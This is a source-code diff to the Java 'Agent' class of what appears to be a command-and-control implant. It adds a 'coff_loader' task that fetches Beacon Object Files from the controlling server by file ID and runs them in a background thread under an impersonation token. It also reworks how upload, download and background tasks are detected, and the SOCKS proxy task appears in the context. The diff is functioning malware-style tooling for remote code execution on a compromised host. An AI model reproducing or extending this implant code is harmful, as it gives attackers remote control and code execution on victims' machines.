@@ -195,15 +195,23 @@ public class Agent {
             // Execute the task with proper parameters
             String output = taskManager.executeTask(command, parameters);
             
-            // Check if the result indicates a background task should be started
-            java.util.Map<String, Object> result = commHandler.createTaskResult(taskId, output);
-            
-            // If the result has a "download" or "upload" field and no "completed", it's requesting background processing
-            if ((result.containsKey("download") || result.containsKey("upload")) && !result.containsKey("completed")) {
-                Config.debugLog(config, "Task " + taskId + " requires background processing");
-                return startBackgroundTask(taskId, command, parameters);
+            // Check if the output is JSON with special background task keys (download, upload, coff_loader)
+            // Must check BEFORE wrapping in createTaskResult()
+            try {
+                com.fasterxml.jackson.databind.JsonNode outputNode = new com.fasterxml.jackson.databind.ObjectMapper().readTree(output);
+                
+                if ((outputNode.has("download") || outputNode.has("upload") || outputNode.has("coff_loader")) 
+                    && !outputNode.has("completed")) {
+                    Config.debugLog(config, "Task " + taskId + " output indicates background processing needed");
+                    return startBackgroundTask(taskId, command, parameters);
+                }
+            } catch (Exception e) {
+                // Not JSON or doesn't have special keys, treat as normal output
+                Config.debugLog(config, "Task output is not background-task JSON, proceeding normally");
             }
             
+            // Normal task completion
+            java.util.Map<String, Object> result = commHandler.createTaskResult(taskId, output);
             return result;
             
         } catch (Exception e) {
@@ -327,6 +335,52 @@ public class Agent {
                 
                 // Return the initial upload response (without completed flag)
                 return commHandler.createTaskResult(taskId, output);
+            }
+            
+            if ("coff_loader".equals(command)) {
+                // Execute the coff_loader task to get metadata
+                String output = taskManager.executeTask(command, parameters);
+                
+                // Check if output is an error
+                if (output.startsWith("Error:") || output.startsWith("Unknown command:")) {
+                    return commHandler.createTaskError(taskId, output.substring(output.indexOf(":") + 1).trim());
+                }
+                
+                // Parse the coff_loader metadata from the response
+                com.fasterxml.jackson.databind.JsonNode responseNode = mapper.readTree(output);
+                
+                // Check if there's a coff_loader key
+                if (!responseNode.has("coff_loader")) {
+                    return commHandler.createTaskResult(taskId, output);
+                }
+                
+                String fileId = responseNode.get("coff_loader").get("file_id").asText();
+                String dllId = responseNode.get("coff_loader").get("dll_id").asText();
+                String bofName = responseNode.get("coff_loader").get("bof_name").asText();
+                String argsB64 = responseNode.get("coff_loader").get("args").asText();
+                int chunkSize = responseNode.get("coff_loader").get("chunk_size").asInt();
+                
+                Config.debugLog(config, "COFF Loader metadata - bof: " + bofName + ", fileId: " + fileId + ", dllId: " + dllId);
+                
+                // Create the background task
+                final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                final WinNT.HANDLE tokenForBgTask = currentImpersonationToken;
+                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
+                    new com.woopsie.tasks.CoffLoaderBackgroundTask(taskHolder[0], config, fileId, dllId, 
+                        bofName, argsB64, chunkSize, tokenForBgTask).run();
+                });
+                taskHolder[0] = bgTask;
+                
+                // Store the background task
+                backgroundTasks.put(taskId, bgTask);
+                
+                // Start the background task thread
+                bgTask.start();
+                
+                Config.debugLog(config, "Background COFF Loader task started for: " + taskId);
+                
+                // Return initial response
+                return commHandler.createTaskResult(taskId, "Downloading and executing BOF: " + bofName + "\n");
             } else if ("socks".equals(command)) {
                 // SOCKS proxy - start background task
                 Config.debugLog(config, "Starting SOCKS background task");
